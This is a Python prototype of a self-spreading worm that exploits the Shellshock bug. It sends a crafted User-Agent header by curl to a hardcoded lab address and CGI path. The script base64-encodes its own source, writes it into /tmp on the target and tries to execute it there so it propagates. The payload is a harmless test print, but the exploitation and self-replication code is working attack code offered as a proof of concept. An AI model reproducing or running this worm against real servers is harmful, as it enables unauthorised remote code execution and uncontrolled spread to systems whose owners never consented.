#!/usr/bin/env python3

import os, sys, subprocess
import base64
from datetime import datetime

# Test payload information
payload_name = 'test_payload'
payload_content = "print('test_payload successfully executed')"

# Worm tracking information
def log():
	timestamp = datetime.now().strftime("%m-%d-%Y %H:%M:%S.%f")
	hostinfo = os.uname()

	f = open('log','x')
	f.write(f'{timestamp}\n{hostinfo}\n')
	f.close()

# Creates a copy of the payload on host
def copy_payload():
	print('run copy')
	try:
		f = open(payload_name,'x') # 'x' opens for exclusive creation, failing if the file already exists
		f.write(payload_content)
		f.close()
	except:
		# This can potentially check if a host has been infected, but the method isn't robust
		print(f'{payload_name} already exists on this host, so it will not be copied/executed! Worm will now die')
		sys.exit(0)

# Executes payload on host
def execute_payload():
	print('run execute')
	exec(open(payload_name).read())
	#os.chmod(payload_name, 0o744) # Changes permissions to: -rwxr--r--
	log()

"""
# Rudimentary way to make a LOCAL copy of itself when executed
def local_replicate():
	script = sys.argv
	name = script[0]

	os.mkdir('test')
	os.system('cp ' + name + ' test')
"""

# Prototype for shellshock exploit via python
def exploit():
	print('run exploit')
	targets = {'192.168.56.111': '/cgi-bin/shock.sh'} # Hardcoding this for now

	# Test if host has already been wormed: if yes, create test_already_wormed folder and exits
	if os.path.exists('/tmp/test_payload'):
		print('Machine has already been wormed!')
		os.mkdir('test_already_wormed')
		sys.exit(0)

	# Base64 encode the worm source code for easy injection
	data = open(sys.argv[0], 'rb').read() # Change sys.argv[0]
	encoded = base64.b64encode(data).decode()

	# Hardcoding this for now, preliminary test for RCE and file creation/execution on vulnerable host
	cmd_list = []
	cmd_list.append('echo ZWNobyAnUkNFIHN1Y2Nlc3NmdWwnID4gL3RtcC90ZXN0X1JDRXN1Y2Nlc3MudHh0 > /tmp/testRCE') # echo 'RCE successful' > /tmp/test_RCEsuccess.txt
	cmd_list.append('base64 -d /tmp/testRCE > /tmp/testRCE.sh')
	cmd_list.append('chmod 777 /tmp/testRCE.sh')
	cmd_list.append('/tmp/testRCE.sh') # Successful when test_success.txt file gets created, proving creation and execution of a file on remote host

	# Worm copying itself & executing itself on vulnerable host
	cmd_list.append(f'echo {encoded} > /tmp/testworm')
	cmd_list.append('base64 -d /tmp/testworm > /tmp/testworm.py')
	cmd_list.append('chmod 777 /tmp/testworm.py')

	#cmd_list.append('python3 /tmp/testworm.py') #doesn't work
	#cmd_list.append('/tmp/testworm.py') #doesn't work

	# Actually executing the worm; cmd_list.append('python3 /tmp/testworm.py') and its variants didn't work...so using a bash script for now
	# So this still doesn't work... is it because python cannot be executed through a webshell
	cmd_list.append('echo cHl0aG9uMyAvdG1wL3Rlc3R3b3JtLnB5 > /tmp/testRun') # python3 /tmp/testworm.py
	cmd_list.append('base64 -d /tmp/testRun > /tmp/testRun.sh')
	cmd_list.append('chmod 777 /tmp/testRun.sh')
	cmd_list.append('/tmp/testRun.sh')

#	print(cmd_list) # Debug

	for IP in targets:
		vulnerable_path = targets[IP]
		url = f'http://{IP}{vulnerable_path}'
		print(url) # Debug

# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '/tmp/testRun.sh'" http://192.168.56.111/cgi-bin/shock.sh

		for cmd in cmd_list:
			print('run cmd')
			exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
			exploit += '\'' + cmd + '\'"'
			exploit += ' ' + url
		#	subprocess.run(exploit, shell=True)
			os.system(exploit)

def main():
	# TODO:
	# - Also implement something so worm doesn't infect the computer that started it
	#
	# checkifrunning() # if worm already exists on host, then exit
	# gettargetIPs() # for now/simplicity/POC, just check if port 80 is open
	# shellshockvulnscan(targetIPs) # check common cgi paths for shellshock vuln
	#	returns target ip with its associated vulnerable path (if none, then exit program)
	# createpayloadarray()
	# exploit() # worm exploits shellshock vuln, copies itself over, then executes itself

	copy_payload()
	execute_payload()
	exploit() # spread
	# local_replicate() # This will not be necessary


	"""
	Making a copy of itself on vulnerable host:
	1) Identify RCE vulnerability
	2) Bring this script to host using RCE vulnerability (eg. echo [contents] > /tmp/worm)
	3) Execute /tmp/worm on vulnerable host
	4) This will propagage
	"""

main()
